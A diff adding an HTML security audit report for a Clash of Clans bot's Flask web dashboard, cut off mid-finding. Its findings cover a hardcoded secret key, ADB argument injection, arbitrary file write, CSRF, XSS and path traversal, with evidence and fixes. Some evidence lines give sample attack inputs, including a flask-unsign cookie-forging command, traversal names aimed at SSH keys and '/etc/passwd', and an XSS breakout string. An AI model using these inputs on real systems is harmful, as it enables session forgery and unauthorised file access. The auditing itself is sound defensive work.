@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security Audit — COC Bot</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0a0a0a;
+      --surface: #111;
+      --border: #222;
+      --text: #e0e0e0;
+      --muted: #666;
+
+      --crit-bg:   #1a0505;
+      --crit-border: #6b1010;
+      --crit-badge: #e03030;
+      --crit-glow: rgba(220, 40, 40, 0.15);
+
+      --high-bg:   #1a0d02;
+      --high-border: #6b3a05;
+      --high-badge: #e07020;
+      --high-glow: rgba(220, 110, 20, 0.15);
+
+      --med-bg:    #1a1500;
+      --med-border: #6b5c00;
+      --med-badge: #d4b000;
+      --med-glow: rgba(212, 176, 0, 0.12);
+
+      --low-bg:    #0d1a0d;
+      --low-border: #2a6b2a;
+      --low-badge: #4caf50;
+      --low-glow: rgba(76, 175, 80, 0.1);
+
+      --info-bg:   #0a0f1a;
+      --info-border: #1a3a6b;
+      --info-badge: #4090d0;
+      --info-glow: rgba(64, 144, 208, 0.1);
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      min-height: 100vh;
+      padding: 2rem 1rem;
+    }
+
+    header {
+      max-width: 900px;
+      margin: 0 auto 2.5rem;
+    }
+
+    header h1 {
+      font-size: 1.7rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.3rem;
+    }
+
+    header p {
+      color: var(--muted);
+      font-size: 0.9rem;
+    }
+
+    /* Summary bar */
+    .summary {
+      max-width: 900px;
+      margin: 0 auto 2.5rem;
+      display: flex;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    .summary-card {
+      flex: 1;
+      min-width: 120px;
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      text-align: center;
+      border: 1px solid;
+    }
+
+    .summary-card .count {
+      font-size: 2.2rem;
+      font-weight: 800;
+      line-height: 1;
+    }
+
+    .summary-card .label {
+      font-size: 0.75rem;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-top: 0.4rem;
+      opacity: 0.8;
+    }
+
+    .sc-crit  { background: var(--crit-bg); border-color: var(--crit-border); color: var(--crit-badge); }
+    .sc-high  { background: var(--high-bg); border-color: var(--high-border); color: var(--high-badge); }
+    .sc-med   { background: var(--med-bg);  border-color: var(--med-border);  color: var(--med-badge);  }
+    .sc-low   { background: var(--low-bg);  border-color: var(--low-border);  color: var(--low-badge);  }
+    .sc-info  { background: var(--info-bg); border-color: var(--info-border); color: var(--info-badge); }
+
+    /* Filter bar */
+    .filters {
+      max-width: 900px;
+      margin: 0 auto 1.5rem;
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+
+    .filter-btn {
+      padding: 0.4rem 1rem;
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      background: var(--surface);
+      color: var(--muted);
+      font-size: 0.82rem;
+      cursor: pointer;
+      transition: all 0.15s;
+      font-family: inherit;
+    }
+
+    .filter-btn:hover { border-color: #444; color: var(--text); }
+    .filter-btn.active { color: #fff; border-color: transparent; }
+    .filter-btn.active.f-all    { background: #333; }
+    .filter-btn.active.f-crit   { background: var(--crit-badge); }
+    .filter-btn.active.f-high   { background: var(--high-badge); }
+    .filter-btn.active.f-medium { background: var(--med-badge); color: #111; }
+    .filter-btn.active.f-low    { background: var(--low-badge); color: #111; }
+    .filter-btn.active.f-info   { background: var(--info-badge); }
+
+    /* Cards */
+    .cards {
+      max-width: 900px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .card {
+      border-radius: 10px;
+      border: 1px solid;
+      padding: 1.3rem 1.5rem;
+      transition: box-shadow 0.2s;
+      cursor: pointer;
+    }
+
+    .card:hover { filter: brightness(1.08); }
+
+    .card.sev-CRITICAL     { background: var(--crit-bg); border-color: var(--crit-border); box-shadow: 0 0 0 0 var(--crit-glow); }
+    .card.sev-HIGH         { background: var(--high-bg); border-color: var(--high-border); }
+    .card.sev-MEDIUM       { background: var(--med-bg);  border-color: var(--med-border);  }
+    .card.sev-LOW          { background: var(--low-bg);  border-color: var(--low-border);  }
+    .card.sev-INFORMATIONAL{ background: var(--info-bg); border-color: var(--info-border); }
+
+    .card-header {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.9rem;
+    }
+
+    .badge {
+      padding: 0.2rem 0.65rem;
+      border-radius: 5px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.07em;
+      text-transform: uppercase;
+      white-space: nowrap;
+      flex-shrink: 0;
+      margin-top: 0.1rem;
+    }
+
+    .sev-CRITICAL     .badge { background: var(--crit-badge); color: #fff; }
+    .sev-HIGH         .badge { background: var(--high-badge); color: #fff; }
+    .sev-MEDIUM       .badge { background: var(--med-badge);  color: #111; }
+    .sev-LOW          .badge { background: var(--low-badge);  color: #111; }
+    .sev-INFORMATIONAL .badge { background: var(--info-badge); color: #fff; }
+
+    .card-title {
+      font-size: 0.97rem;
+      font-weight: 600;
+      line-height: 1.4;
+      flex: 1;
+    }
+
+    .card-id {
+      font-size: 0.75rem;
+      color: var(--muted);
+      margin-top: 0.15rem;
+      font-family: monospace;
+    }
+
+    .card-meta {
+      display: flex;
+      gap: 1.5rem;
+      margin-top: 0.9rem;
+      font-size: 0.8rem;
+      color: var(--muted);
+      flex-wrap: wrap;
+    }
+
+    .card-meta span strong {
+      color: #aaa;
+      font-weight: 500;
+    }
+
+    .card-body {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+      color: #bbb;
+      line-height: 1.6;
+      display: none;
+      border-top: 1px solid rgba(255,255,255,0.06);
+      padding-top: 1rem;
+    }
+
+    .card.open .card-body { display: block; }
+
+    .card-body code {
+      font-family: 'Courier New', monospace;
+      background: rgba(0,0,0,0.4);
+      padding: 0.1rem 0.35rem;
+      border-radius: 3px;
+      font-size: 0.82rem;
+      color: #e0c060;
+    }
+
+    .card-body pre {
+      background: rgba(0,0,0,0.5);
+      border: 1px solid rgba(255,255,255,0.07);
+      border-radius: 6px;
+      padding: 0.9rem 1rem;
+      margin: 0.6rem 0;
+      overflow-x: auto;
+      font-size: 0.8rem;
+      color: #d0d0d0;
+      font-family: 'Courier New', monospace;
+      line-height: 1.5;
+    }
+
+    .section-label {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin: 0.9rem 0 0.3rem;
+    }
+
+    .chevron {
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+      margin-top: 0.2rem;
+      opacity: 0.4;
+      transition: transform 0.2s;
+    }
+
+    .card.open .chevron { transform: rotate(180deg); opacity: 0.7; }
+
+    .hidden { display: none !important; }
+
+    /* Fixed finding styles */
+    .card.status-fixed {
+      opacity: 0.55;
+      border-style: dashed !important;
+    }
+    .card.status-fixed .card-title {
+      text-decoration: line-through;
+    }
+    .fixed-badge {
+      display: inline-block;
+      padding: 0.15rem 0.5rem;
+      border-radius: 4px;
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 0.07em;
+      text-transform: uppercase;
+      background: #2e7d32;
+      color: #fff;
+      margin-left: 0.5rem;
+      vertical-align: middle;
+    }
+    .card-body .remediation-note {
+      margin-top: 0.8rem;
+      padding: 0.7rem 1rem;
+      border-radius: 6px;
+      background: rgba(46, 125, 50, 0.15);
+      border: 1px solid rgba(46, 125, 50, 0.3);
+      font-size: 0.82rem;
+      color: #81c784;
+    }
+    .card-body .remediation-note strong {
+      color: #a5d6a7;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>Security Audit Report</h1>
+  <p>Project: Clash of Clans Bot &nbsp;·&nbsp; Date: 2026-03-21 &nbsp;·&nbsp; 27 findings (incl. 7 new proxy findings) &nbsp;·&nbsp; 3 fixed</p>
+</header>
+
+<div class="summary">
+  <div class="summary-card sc-crit">
+    <div class="count">0</div>
+    <div class="label">Critical (Open)</div>
+  </div>
+  <div class="summary-card sc-high">
+    <div class="count">5</div>
+    <div class="label">High</div>
+  </div>
+  <div class="summary-card sc-med">
+    <div class="count">6</div>
+    <div class="label">Medium</div>
+  </div>
+  <div class="summary-card sc-low">
+    <div class="count">8</div>
+    <div class="label">Low</div>
+  </div>
+  <div class="summary-card sc-info">
+    <div class="count">5</div>
+    <div class="label">Info</div>
+  </div>
+  <div class="summary-card sc-fixed" style="background:#0d1a0d;border-color:#2e7d32;color:#4caf50;">
+    <div class="count">3</div>
+    <div class="label">Fixed</div>
+  </div>
+</div>
+
+<div class="filters">
+  <button class="filter-btn active f-all"  onclick="filter('all')">All (27)</button>
+  <button class="filter-btn f-crit"         onclick="filter('CRITICAL')">Critical (3)</button>
+  <button class="filter-btn f-high"         onclick="filter('HIGH')">High (5)</button>
+  <button class="filter-btn f-medium"       onclick="filter('MEDIUM')">Medium (6)</button>
+  <button class="filter-btn f-low"          onclick="filter('LOW')">Low (8)</button>
+  <button class="filter-btn f-info"         onclick="filter('INFORMATIONAL')">Info (5)</button>
+</div>
+
+<div class="cards" id="cards"></div>
+
+<script>
+const findings = [
+  {
+    id: "CRIT-001",
+    severity: "CRITICAL",
+    title: "Hardcoded Fallback Secret Key Invalidates Session Security",
+    file: "web/app.py:22",
+    category: "Cryptography / Authentication",
+    description: "The Flask SECRET_KEY falls back to the hardcoded string <code>\"coc-bot-secret-change-me\"</code> when <code>COC_BOT_SECRET</code> is not set. With the known key, an attacker can forge valid session cookies using <code>flask-unsign</code> — granting full dashboard access without a password.",
+    evidence: `web/app.py:22
+app.config["SECRET_KEY"] = os.environ.get("COC_BOT_SECRET", "coc-bot-secret-change-me")
+
+# Forge a session cookie with:
+# flask-unsign --sign --cookie "{'logged_in': True}" --secret "coc-bot-secret-change-me"`,
+    fix: `secret = os.environ.get("COC_BOT_SECRET")
+if not secret:
+    raise RuntimeError("COC_BOT_SECRET must be set")
+app.config["SECRET_KEY"] = secret
+
+# Generate a key: python3 -c "import secrets; print(secrets.token_hex(32))"`,
+    status: "FIXED",
+    fixDate: "2026-03-21",
+    remediationApplied: "Removed hardcoded fallback. A random secret is generated via secrets.token_hex(32) when COC_BOT_SECRET is not set, with a warning logged. Optional python-dotenv support loads .env files.",
+  },
+  {
+    id: "CRIT-002",
+    severity: "CRITICAL",
+    title: "ADB Device Serial & Tap Coordinate Argument Injection",
+    file: "bot/adb_controller.py:23-29, web/app.py:273-277",
+    category: "Command Injection (CWE-88)",
+    description: "The <code>x</code>/<code>y</code> values from <code>/api/strategy/tap</code> are passed raw to <code>adb shell input tap</code>. The device serial from <code>config.yaml</code> is inserted into the ADB command list unsanitized, enabling flag injection. No integer validation or range checks exist.",
+    evidence: `adb_controller.py:23-29
+def _cmd(self, *args):
+    cmd = ["adb"]
+    if self.serial:
+        cmd += ["-s", self.serial]  # serial is unsanitized
+    cmd += list(args)
+
+web/app.py:273-277
+x = request.json.get("x", 0)   # no type/range check
+y = request.json.get("y", 0)
+bot.adb.tap(x, y, scale=False)`,
+    fix: `x = int(request.json.get("x", 0))
+y = int(request.json.get("y", 0))
+if not (0 <= x <= 4096 and 0 <= y <= 4096):
+    return jsonify({"error": "Invalid coordinates"}), 400
+
+# Validate serial:
+if serial and not re.match(r'^[a-zA-Z0-9:._\\-]{1,64}$', serial):
+    raise ValueError("Invalid device serial")`,
+    status: "FIXED",
+    fixDate: "2026-03-21",
+    remediationApplied: "Added strict regex validation on device serial in ADBController.__init__(). Added integer casting and 0-4096 range check on x/y in /api/strategy/tap.",
+  },
+  {
+    id: "CRIT-003",
+    severity: "CRITICAL",
+    title: "Authenticated Arbitrary File Write via /api/config POST",
+    file: "web/app.py:208-228",
+    category: "Arbitrary File Write / RCE",
+    description: "The <code>/api/config</code> POST endpoint accepts arbitrary text, validates only that it is valid YAML, then writes it to <code>config_path</code> with no path confinement. Combined with the CLI <code>--config</code> flag accepting any path, this is a full arbitrary file write primitive.",
+    evidence: `web/app.py:208-228
+new_config_text = request.json.get("config", "")
+yaml.safe_load(new_config_text)          # only YAML syntax checked
+with open(config_path, "w") as f:
+    f.write(new_config_text)             # writes anywhere on disk`,
+    fix: `from pathlib import Path
+project_root = Path(__file__).parent.parent.resolve()
+resolved = Path(config_path).resolve()
+if not str(resolved).startswith(str(project_root)):
+    return jsonify({"error": "Path outside project root"}), 403`,
+    status: "FIXED",
+    fixDate: "2026-03-21",
+    remediationApplied: "Added _is_config_path_safe() helper that resolves config_path and verifies it is within the project root. Both GET and POST /api/config return 403 if the path escapes the project directory.",
+  },
+  {
+    id: "HIGH-001",
+    severity: "HIGH",
+    title: "No TLS — All Traffic Transmitted in Plaintext",
+    file: "web/app.py:342",
+    category: "Cryptography / Network (CWE-319)",
+    description: "The server binds on all interfaces (<code>0.0.0.0</code>) with plain HTTP. Login credentials, session cookies, live screenshots, and the ADB serial number are all transmitted in cleartext — readable by anyone on the same network.",
+    evidence: `socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
+# No SSL context configured anywhere in the codebase`,
+    fix: `# Option A: reverse proxy (recommended)
+# nginx with Let's Encrypt in front of the Flask app
+
+# Option B: pass ssl_context to socketio.run()
+import ssl
+ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+ctx.load_cert_chain("cert.pem", "key.pem")
+socketio.run(app, ..., ssl_context=ctx)
+
+# Also restrict bind to localhost if remote access isn't needed:
+socketio.run(app, host="127.0.0.1", ...)`,
+  },
+  {
+    id: "HIGH-002",
+    severity: "HIGH",
+    title: "Complete Absence of CSRF Protection on All State-Changing Endpoints",
+    file: "web/app.py:155-299",
+    category: "CSRF (CWE-352)",
+    description: "No CSRF token, SameSite restriction, or Origin validation is implemented. Every POST endpoint (<code>/api/start</code>, <code>/api/stop</code>, <code>/api/config</code>, <code>/api/strategy/tap</code>, etc.) is vulnerable. An authenticated user visiting a malicious site can have their bot silently controlled.",
+    evidence: `# All POST routes protected by @login_required only
+# SESSION_COOKIE_SAMESITE not configured
+# No Origin/Referer check on any endpoint
+# No CSRF token on any form or AJAX call`,
+    fix: `# Install: pip install flask-wtf
+from flask_wtf.csrf import CSRFProtect
+csrf = CSRFProtect(app)
+
+# Or set strict SameSite:
+app.config["SESSION_COOKIE_SAMESITE"] = "Strict"`,
+  },
+  {
+    id: "HIGH-003",
+    severity: "HIGH",
+    title: "Unconstrained WebSocket — Any Origin Can Connect",
+    file: "web/app.py:23",
+    category: "CORS / WebSocket (CWE-942)",
+    description: "<code>cors_allowed_origins=\"*\"</code> allows WebSocket connections from any web page on any domain. This enables malicious pages to potentially receive the live screenshot stream and log data, and disables the browser's same-origin protections for all API responses.",
+    evidence: `socketio = SocketIO(app, cors_allowed_origins="*")
+# Access-Control-Allow-Origin: * is set on all HTTP responses`,
+    fix: `# Lock down to the specific host(s) that serve the dashboard
+socketio = SocketIO(app, cors_allowed_origins=["http://localhost:8080"])`,
+  },
+  {
+    id: "HIGH-004",
+    severity: "HIGH",
+    title: "Path Traversal in Strategy File Write & Replay",
+    file: "bot/actions/strategy_recorder.py:52-53, web/app.py:251-252",
+    category: "Path Traversal (CWE-22)",
+    description: "The strategy name from the client is used directly to construct a filesystem path. A name containing <code>../</code> allows writing to or reading from arbitrary locations. Example: <code>{\"name\": \"../../web/templates/index\"}</code> writes outside the strategies directory.",
+    evidence: `# strategy_recorder.py:52-53
+filepath = os.path.join(STRATEGIES_DIR, f"{name}.json")
+# name="../../.ssh/authorized_keys" → writes ~/.ssh/authorized_keys.json
+
+# web/app.py:251-252
+name = request.json.get("name", "default")   # unsanitized
+filepath = bot.strategy_recorder.stop_recording(name)`,
+    fix: `import re
+if not re.match(r'^[a-zA-Z0-9_\\-]{1,64}$', name):
+    return jsonify({"error": "Invalid strategy name"}), 400
+
+# Also verify resolved path stays within STRATEGIES_DIR:
+from pathlib import Path
+target = (Path(STRATEGIES_DIR).resolve() / f"{name}.json").resolve()
+if Path(STRATEGIES_DIR).resolve() not in target.parents:
+    return jsonify({"error": "Path escape detected"}), 400`,
+  },
+  {
+    id: "HIGH-005",
+    severity: "HIGH",
+    title: "Vision Template Loader Allows Absolute Path Injection",
+    file: "bot/vision.py:25-26",
+    category: "Path Traversal (CWE-22)",
+    description: "The <code>_load_template()</code> method bypasses the templates directory entirely for absolute paths. Template paths can be influenced via <code>config.yaml</code> vision overrides. An attacker who can write <code>config.yaml</code> can point template matching at arbitrary filesystem locations.",
+    evidence: `# vision.py:25-26
+full_path = os.path.join(self.templates_dir, path) if not os.path.isabs(path) else path
+# If path="/etc/passwd" → full_path="/etc/passwd" (no confinement)`,
+    fix: `full_path = os.path.join(self.templates_dir, path)
+full_path = os.path.realpath(full_path)
+templates_abs = os.path.realpath(self.templates_dir)
+if not full_path.startswith(templates_abs + os.sep):
+    logger.error("Template path escapes directory: %s", path)
+    return None`,
+  },
+  {
+    id: "MED-001",
+    severity: "MEDIUM",
+    title: "Strategy Name Reflected in API Response & Injected into innerHTML",
+    file: "web/app.py:252-254, web/templates/index.html:375-379",
+    category: "XSS / Info Disclosure (CWE-79)",
+    description: "The strategy name is echoed verbatim in the JSON response and injected into <code>innerHTML</code> including inside an <code>onclick</code> attribute. A crafted name like <code>'); alert(1); //</code> could break out of the attribute and execute script. The full server-side filepath is also leaked.",
+    evidence: `# index.html:375-379
+container.innerHTML = data.strategies.map(s =>
+    \`<button onclick="replayStrategy('\${s.name}')">\${s.name}</button>\`
+).join('');
+# s.name comes directly from server — no escaping`,
+    fix: `# Server: whitelist strategy names before saving
+if not re.match(r'^[a-zA-Z0-9_\\-]{1,64}$', name):
+    return jsonify({"error": "Invalid name"}), 400
+
+# Client: use DOM APIs instead of innerHTML
+const btn = document.createElement("button");
+btn.textContent = s.name;
+btn.onclick = () => replayStrategy(s.name);`,
+  },
+  {
+    id: "MED-002",
+    severity: "MEDIUM",
+    title: "Session Cookie Missing Security Flags",
+    file: "web/app.py:21-23",
+    category: "Session Management (CWE-614)",
+    description: "<code>SESSION_COOKIE_HTTPONLY</code>, <code>SESSION_COOKIE_SECURE</code>, and <code>SESSION_COOKIE_SAMESITE</code> are not configured. Without <code>HttpOnly</code>, XSS can steal the cookie. Without <code>SameSite</code>, cross-origin requests include the cookie, compounding the CSRF risk.",
+    evidence: `# web/app.py — only SECRET_KEY is set, nothing else:
+app.config["SECRET_KEY"] = os.environ.get(...)
+# Missing:
+# SESSION_COOKIE_HTTPONLY = True
+# SESSION_COOKIE_SAMESITE = "Lax"
+# SESSION_COOKIE_SECURE   = True  (when TLS is added)`,
+    fix: `app.config["SESSION_COOKIE_HTTPONLY"] = True
+app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
+# Enable after TLS is configured:
+app.config["SESSION_COOKIE_SECURE"] = True`,
+  },
+  {
+    id: "MED-003",
+    severity: "MEDIUM",
+    title: "Log Buffer Race Condition / Uncontrolled Resource Exhaustion",
+    file: "web/app.py:99-113",
+    category: "Race Condition (CWE-362, CWE-400)",
+    description: "<code>log_buffer</code> is a plain list shared between the bot thread and Flask request threads with no lock. The <code>append</code> + conditional <code>pop</code> is not atomic. Under high log volume the buffer can grow beyond <code>MAX_LOG_LINES</code> or corrupt iteration state.",
+    evidence: `log_buffer.append(msg)
+if len(log_buffer) > MAX_LOG_LINES:
+    log_buffer.pop(0)   # check-then-act, not atomic`,
+    fix: `from collections import deque
+log_buffer = deque(maxlen=200)
+# deque(maxlen=N) has atomic append with automatic eviction — no lock needed`,
+  },
+  {
+    id: "MED-004",
+    severity: "MEDIUM",
+    title: "Config File Path Controlled by CLI Without Validation",
+    file: "main.py:21, web/app.py:117-121",
+    category: "Arbitrary File Read/Write (CWE-22)",
+    description: "The <code>--config</code> argument is stored as <code>config_path</code> with no path validation. <code>/api/config GET</code> reads and returns the full contents of this file; <code>/api/config POST</code> writes to it. If an attacker controls the startup command, they can exfiltrate arbitrary files via the API.",
+    evidence: `main.py:21
+config = load_config(args.config)      # no path check
+
+web/app.py:117-121
+config_path = cfg_path                 # stored globally, no validation
+with open(config_path, "r") as f:
+    return jsonify({"config": f.read()}) # full file contents returned`,
+    fix: `from pathlib import Path
+resolved = Path(cfg_path).resolve()
+project_root = Path(__file__).parent.resolve()
+if not str(resolved).startswith(str(project_root)):
+    raise ValueError("Config path must be within project root")`,
+  },
+  {
+    id: "LOW-001",
+    severity: "LOW",
+    title: "users.json Git History Exposure Risk",
+    file: "users.json, .gitignore",
+    category: "Credential Exposure (CWE-312)",
+    description: "<code>users.json</code> is correctly gitignored now, but if it was ever staged before the gitignore entry was added, the password hash would remain in git history indefinitely. An offline dictionary attack against <code>pbkdf2:sha256</code> could recover a weak password.",
+    evidence: `# Verify it was never committed:
+git log --all --full-history -- users.json`,
+    fix: `# If it appears in history, purge it:
+git filter-repo --path users.json --invert-paths
+# Then rotate the password.`,
+  },
+  {
+    id: "LOW-002",
+    severity: "LOW",
+    title: "Logout Endpoint Accepts GET Requests (Logout CSRF)",
+    file: "web/app.py:91-94",
+    category: "CSRF / Session (CWE-352)",
+    description: "The <code>/logout</code> route is a plain GET endpoint. A malicious page can embed <code>&lt;img src=\"http://bothost:8080/logout\"&gt;</code> to silently log out an authenticated user — a denial of service against their session.",
+    evidence: `@app.route("/logout")          # GET — no CSRF protection
+def logout():
+    session.clear()
+    return redirect(url_for("login"))`,
+    fix: `@app.route("/logout", methods=["POST"])
+@login_required
+def logout():
+    session.clear()
+    return redirect(url_for("login"))
+# And use a <form method="POST"> for the logout button`,
+  },
+  {
+    id: "LOW-003",
+    severity: "LOW",
+    title: "Strategy Files Are World-Readable",
+    file: "strategies/ (directory)",
+    category: "Filesystem Permissions (CWE-732)",
+    description: "Strategy JSON files are created with the default umask (<code>0o644</code> — world-readable). These files encode exact tap coordinates for attacks, revealing the device screen layout and attack patterns to any local user on the system.",
+    evidence: `$ ls -la strategies/
+-rw-r--r--  default.json   (world-readable)
+-rw-r--r--  bunu.json
+-rw-r--r--  new.json`,
+    fix: `import stat, os
+# After writing the file in strategy_recorder.py:
+os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)  # 0o600 — owner only`,
+  },
+  {
+    id: "LOW-004",
+    severity: "LOW",
+    title: "No Brute-Force Protection on Login Endpoint",
+    file: "web/app.py:56-69",
+    category: "Authentication (CWE-307)",
+    description: "The login route has no rate limiting, account lockout, or CAPTCHA. An attacker with network access can make unlimited login attempts against the dashboard (which binds on <code>0.0.0.0</code> by default).",
+    evidence: `# No attempt counter, no sleep on failure, no lockout:
+if username == user["username"] and check_password_hash(...):
+    session["logged_in"] = True
+error = "Invalid username or password."`,
+    fix: `# pip install flask-limiter
+from flask_limiter import Limiter, util
+limiter = Limiter(app, key_func=util.get_remote_address)
+
+@limiter.limit("10 per minute")
+@app.route("/login", methods=["GET", "POST"])
+def login(): ...`,
+  },
+  {
+    id: "LOW-005",
+    severity: "LOW",
+    title: "Donation History Rendered with innerHTML Without Escaping",
+    file: "web/templates/index.html:291-295",
+    category: "Stored XSS (CWE-79)",
+    description: "The <code>updateHistory()</code> function builds table rows using template literals and sets them via <code>innerHTML</code>. The <code>h.troop</code> field comes from config-driven troop names. If an attacker can write a malicious <code>config.yaml</code>, they can inject HTML/JavaScript into the dashboard.",
+    evidence: `tbody.innerHTML = recent.map(h => {
+    return \`<tr><td>\${timeStr}</td><td>\${h.troop}</td></tr>\`;
+}).join('');
+// h.troop is unescaped — attacker-controlled via config`,
+    fix: `// Use DOM APIs instead:
+const tr = document.createElement("tr");
+const tdTime = document.createElement("td");
+const tdTroop = document.createElement("td");
+tdTime.textContent = timeStr;
+tdTroop.textContent = h.troop;   // textContent auto-escapes
+tr.append(tdTime, tdTroop);
+tbody.appendChild(tr);`,
+  },
+  {
+    id: "INFO-001",
+    severity: "INFORMATIONAL",
+    title: "Werkzeug Development Server Used in Production",
+    file: "web/app.py:342",
+    category: "Configuration / Deployment",
+    description: "The server starts with <code>allow_unsafe_werkzeug=True</code>. Werkzeug is single-threaded and not intended for production. If <code>debug=True</code> is ever passed, the interactive Werkzeug debugger (a browser-accessible Python REPL) becomes reachable — effectively RCE.",
+    evidence: `socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)`,
+    fix: `# Deploy with gunicorn + eventlet:
+pip install gunicorn eventlet
+gunicorn --worker-class eventlet -w 1 "web.app:app"
+# Never pass debug=True in a network-accessible deployment`,
+  },
+  {
+    id: "INFO-002",
+    severity: "INFORMATIONAL",
+    title: "No Password Policy Enforced at Signup",
+    file: "web/app.py:81-86",
+    category: "Authentication (CWE-521)",
+    description: "The signup route accepts any non-empty string as a valid password. No minimum length, complexity check, or maximum length cap exists. Single-character passwords are accepted.",
+    evidence: `if not username or not password:
+    error = "Username and password are required."
+elif password != confirm:
+    ...
+else:
+    save_user(username, password)   # no length/complexity check`,
+    fix: `if len(password) < 12:
+    error = "Password must be at least 12 characters."
+elif len(password) > 1024:
+    error = "Password too long."`,
+  },
+  {
+    id: "INFO-003",
+    severity: "INFORMATIONAL",
+    title: "Socket.IO Loaded from CDN Without Subresource Integrity",
+    file: "web/templates/index.html:8",
+    category: "Supply Chain / Client-Side",
+    description: "The Socket.IO client is loaded from <code>cdnjs.cloudflare.com</code> without an SRI hash. If the CDN is compromised or the connection is intercepted (no TLS), a malicious script could be injected into the dashboard page.",
+    evidence: `<script src="https://cdnjs.cloudflare.com/.../socket.io.min.js"><\/script>
+<!-- No integrity="sha384-..." attribute -->`,
+    fix: `<script src="https://cdnjs.cloudflare.com/.../socket.io.min.js"
+        integrity="sha384-<hash>"
+        crossorigin="anonymous"><\/script>
+<!-- Or self-host: cp socket.io.min.js web/static/ -->`,
+  },
+
+  // ── CoC API Proxy Feature Findings (Addendum 2026-03-21) ──
+
+  {
+    id: "PROXY-INFO-001",
+    severity: "INFORMATIONAL",
+    title: "Proxy: syntaxHL Response Renderer Is Not Exploitable for XSS (Confirmed Safe)",
+    file: "web/templates/index.html:716-727",
+    category: "XSS / Secure Design (CWE-79 — not present)",
+    description: "The <code>syntaxHL()</code> function renders JSON API responses via <code>innerHTML</code>. A naive reading suggests XSS risk, but it is safe: <code>escH()</code> HTML-encodes all <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code> on the full JSON string <em>before</em> the regex replacement runs. All <code>span</code> class attributes are hardcoded static strings. No attacker-controlled data reaches an unescaped HTML context.",
+    evidence: `function syntaxHL(json) {
+    return escH(JSON.stringify(json, null, 2)).replace(  // escaping first
+        /("(\\u[...]*"(\s*:)?|...)/g,
+        m => {
+            let c = 'json-num';  // always a static literal
+            return \`<span class="\${c}">\${m}<\/span>\`;
+            // m is already HTML-escaped by escH()
+        }
+    );
+}`,
+    fix: `// No fix required — function is secure.
+// Add a comment to prevent future refactoring from removing the escH() call:
+// SECURITY: escH() must be called before .replace() to prevent XSS.`,
+  },
+  {
+    id: "PROXY-INFO-002",
+    severity: "INFORMATIONAL",
+    title: "Proxy: API Token Re-Transmitted on Every Request (Not Truly Server-Side)",
+    file: "web/templates/index.html:679-683, web/app.py:385-386",
+    category: "Credential Handling / Design",
+    description: "The proxy comment states the key stays server-side, but the token is actually submitted from the browser in the POST body on every API call — not stored server-side. The only benefit is that the CoC API's IP-based key restriction is satisfied by the server's IP. Under the no-TLS condition (HIGH-001), the token travels in plaintext on every proxy call.",
+    evidence: `// index.html — token sent from browser on every request:
+body: JSON.stringify({ token, method: currentEp.method, path, ... })
+
+// app.py — extracted from request body each time:
+token = data.get("token", "").strip()`,
+    fix: `// Store the token in the server-side Flask session after a one-time save:
+// POST /api/coc/key  { "token": "..." }  → session["coc_token"] = token
+// Then coc_proxy reads: token = session.get("coc_token")
+// Never send the token back to the browser.`,
+  },
+  {
+    id: "PROXY-LOW-001",
+    severity: "LOW",
+    title: "Proxy: No HTTP Method Allowlist — Arbitrary Methods Forwarded to CoC API",
+    file: "web/app.py:387, 402",
+    category: "Input Validation (CWE-20, CWE-749)",
+    description: "The proxy accepts any string as the HTTP method (only <code>.upper()</code> is applied). There is no allowlist restricting to GET and POST. An authenticated user can send DELETE, PUT, PATCH, HEAD, OPTIONS, TRACE, or any custom method string to CoC API endpoints, which may violate the API's terms of service or cause unexpected behavior.",
+    evidence: `app.py:387
+method = data.get("method", "GET").upper()   // no allowlist
+
+app.py:402
+req = _ureq.Request(url, data=body_bytes, method=method)
+// method is attacker-controlled`,
+    fix: `ALLOWED_METHODS = {"GET", "POST"}
+method = data.get("method", "GET").upper()
+if method not in ALLOWED_METHODS:
+    return jsonify({"error": "Method not allowed"}), 400`,
+  },
+  {
+    id: "PROXY-LOW-002",
+    severity: "LOW",
+    title: "Proxy: Verbose Exception Messages Disclose Internal Network Details",
+    file: "web/app.py:420-421",
+    category: "Information Disclosure (CWE-209)",
+    description: "The final exception handler in <code>coc_proxy</code> returns <code>str(e)</code> directly to the client. Python's urllib and socket exception messages often include target hostnames, port numbers, local socket addresses, errno values, and OS-level error descriptions, aiding attacker reconnaissance of the server's network configuration.",
+    evidence: `app.py:420-421
+except Exception as e:
+    return jsonify({"error": str(e)}), 500
+
+// Sample urllib error strings leaked to client:
+// "[Errno 8] nodename nor servname provided"
+// "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed..."
+// "Remote end closed connection without response"`,
+    fix: `except Exception as e:
+    logger.error("CoC proxy request failed: %s", e)
+    return jsonify({"error": "Request to CoC API failed"}), 500`,
+  },
+  {
+    id: "PROXY-LOW-003",
+    severity: "LOW",
+    title: "Proxy: No Rate Limiting — API Key Exhaustion and Dashboard DoS",
+    file: "web/app.py:376-421",
+    category: "Rate Limiting / DoS (CWE-400, CWE-770)",
